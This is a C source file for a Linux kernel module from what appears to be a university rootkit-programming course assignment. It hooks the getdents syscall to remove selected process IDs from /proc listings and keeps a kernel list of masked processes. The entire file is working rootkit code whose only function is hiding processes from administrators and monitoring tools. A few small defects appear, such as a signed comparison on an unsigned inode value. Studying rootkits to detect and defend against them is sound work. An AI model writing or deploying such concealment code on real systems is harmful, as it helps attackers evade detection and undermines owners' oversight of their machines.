
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 10                                                            */
/*                                                                             */
/*   Filename: process_masking.c                                               */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: January 2016                                                        */
/*                                                                             */
/*   Usage: ...                                                                */
/*                                                                             */
/*******************************************************************************/

#include <linux/syscalls.h>		/* Needed for __NR_getdents */
#include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
#include <linux/slab.h>			/* Needed for kmalloc & kfree */

#include "core.h"


/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define PRINT(str) printk(KERN_INFO "rootkit process_masking: %s\n", (str))
#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
#define PRINT_PID(pid) printk(KERN_INFO "rootkit process_masking: masking process %d\n", (pid))
#define DEBUG_PRINT_PID(pid) if (show_debug_messages) PRINT_PID(pid)


/* Definition of data structs */
struct linux_dirent {
	long d_ino;
	off_t d_off;
	unsigned short d_reclen;
	char d_name[];
};

struct masked_process {   /* List to keep hidden processes */
	struct list_head list;
	pid_t pid;
};


/* Definition of global variables */
static int show_debug_messages;
static unsigned long proc_ino;
static struct list_head masked_processes;


/* Declaration of functions */
int process_masking_init(int);
int process_masking_exit(void);

asmlinkage int process_masking_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int, int);

int mask_process(pid_t);
int unmask_process(pid_t);

static unsigned long get_inode_no(char *);
static int process_is_masked(pid_t);
static void delete_masked_processes(void);


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


/* Initialization function */
int process_masking_init(int debug_mode_on)
{
	show_debug_messages = debug_mode_on;

	proc_ino = get_inode_no("/proc");
	if (proc_ino < 0)
		return 1;

	INIT_LIST_HEAD(&masked_processes);

	register_callback(__NR_getdents, (void *) process_masking_getdents_syscall);

	DEBUG_PRINT("initialized");

	return 0;
}


int process_masking_exit(void)
{
	deregister_callback(__NR_getdents, (void *) process_masking_getdents_syscall);

	delete_masked_processes();

	DEBUG_PRINT("exited");

	return 0;
}


/* Function that replaces the original getdents syscall. In addition to what
   getdents does, additionally it ...  */
asmlinkage int process_masking_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count, int nread)
{
	int nread_temp;
	int pid;
	char *endptr;

	if (dirp->d_ino != proc_ino)
		return nread;

	nread_temp = nread;

	while (nread_temp > 0) {
		nread_temp -= dirp->d_reclen;

		pid = simple_strtol(dirp->d_name, &endptr, 10);
		if (pid && process_is_masked(pid)) {
			DEBUG_PRINT_PID(pid);
			memmove(dirp, (char *) dirp + dirp->d_reclen, nread_temp);
			nread -= dirp->d_reclen;
			continue;
		}

		if (nread_temp == 0)
			return nread;

		dirp = (struct linux_dirent *) ((char *) dirp + dirp->d_reclen);
	}

	return nread;
}


int mask_process(pid_t pid)
{
	struct masked_process *new;

	if (process_is_masked(pid))
		return -1;

	if ((new = kmalloc(sizeof(struct masked_process), GFP_KERNEL)) == NULL)
		return -ENOMEM;

	new->pid = pid;

	list_add(&new->list, &masked_processes);

	printk(KERN_INFO "rootkit process_masking: process_is_masked - %d\n", process_is_masked(pid));

	return 0;
}


int unmask_process(pid_t pid)
{
	struct masked_process *cur;
	struct list_head *cursor, *next;

	list_for_each_safe(cursor, next, &masked_processes) {
		cur = list_entry(cursor, struct masked_process, list);
		if (cur->pid == pid) {
			list_del(cursor);
			kfree(cur);

			return 0;
		}
	}

	return -EINVAL;
}


/* Function that gets the inode number of the file found under specified path */
static unsigned long get_inode_no(char *path_name)
{
	unsigned long inode_no;
	struct path path;
	struct inode *inode;

	inode_no = -1;

    kern_path(path_name, LOOKUP_FOLLOW, &path);
    inode = path.dentry->d_inode;
	inode_no = inode->i_ino;

	return inode_no;
}


/* Function that checks whether we need to mask the specified pid */
static int process_is_masked(pid_t pid)
{
	struct masked_process *cur;
	struct list_head *cursor;

	list_for_each(cursor, &masked_processes) {
		cur = list_entry(cursor, struct masked_process, list);
		if (cur->pid == pid)
			return 1;
	}

	return 0;
}


static void delete_masked_processes(void)
{
	struct list_head *cursor, *next;
	struct masked_process *masked_process_ptr;

	cursor = next = NULL;
	list_for_each_safe(cursor, next, &masked_processes) {
		masked_process_ptr = list_entry(cursor, struct masked_process, list);
		list_del(cursor);
		kfree(masked_process_ptr);
	}
}

